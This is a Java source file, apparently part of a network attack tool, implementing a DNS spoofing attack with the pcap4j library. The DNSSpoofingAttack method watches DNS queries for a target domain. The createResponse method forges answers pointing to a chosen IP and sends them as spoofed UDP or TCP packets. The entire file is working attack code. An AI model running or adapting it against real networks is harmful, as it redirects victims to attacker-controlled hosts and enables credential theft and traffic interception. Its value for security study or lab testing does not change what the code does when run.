package io.github.danielthedev.gwidt;

import org.pcap4j.packet.*;

import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.List;


public class DnsSpoofer {
    /**
     * Performs DNS Spoofing attack
     *
     * @param input CLI input
     */
    public static void DNSSpoofingAttack(CLI.Input input) {
        System.out.println("Starting DNS spoofer");
        new Thread(() -> {
            NetworkExecutor.getInstance().DNS_INTERFACE.setPacketListener(packets -> {
                DnsPacket dns = packets.getD();

                if (dns.getHeader().getQuestions().stream().anyMatch(dnsQuestion ->
                        dnsQuestion.getQName().getName().equals(input.getSpoofedDomain()) ||
                        dnsQuestion.getQName().getName().equals("www." + input.getSpoofedDomain()))) {
                    createResponse(packets, input.getSpoofedIP());
                }
            });
        }).start();
    }

    /**
     * Create and send spoofed DNS response
     *
     * @param spoofedIP IP address to spoof
     */
    static void createResponse(
            NetworkExecutor.QuadPacket<EthernetPacket, IpV4Packet, TransportPacket, DnsPacket> packets,
            String spoofedIP) throws UnknownHostException {

        List<DnsResourceRecord> resourceRecords = PacketFactory
                .createDnsResourceRecord(packets.getD(), (Inet4Address) Inet4Address.getByName(spoofedIP));
        DnsPacket spoofedDnsPacket = PacketFactory.createDNSResponsePacket(packets.getD(), resourceRecords);
        IpV4Packet ipv4ResponsePacket = null;

        // Build spoofed packet
        if (packets.getC() instanceof UdpPacket udpPacket) {
            TransportPacket transportPacket = PacketFactory
                    .createUDPPacketFromDNSPacket(packets.getB(), udpPacket, spoofedDnsPacket);
            ipv4ResponsePacket = PacketFactory.createIpV4Packet(packets.getB(), transportPacket);
        } else if (packets.getC() instanceof TcpPacket tcpPacket) {
            TransportPacket transportPacket = PacketFactory
                    .createTCPPacketFromDNSPacket(packets.getB(), tcpPacket, spoofedDnsPacket);
            ipv4ResponsePacket = PacketFactory.createIpV4Packet(packets.getB(), transportPacket);
        } else {
            return;
        }
        EthernetPacket ethernetResponsePacket = PacketFactory
                .createEthernetPacketFromIpV4Packet(packets.getA(), ipv4ResponsePacket);

        NetworkExecutor.getInstance().DNS_INTERFACE.sendPacket(ethernetResponsePacket);
    }
}



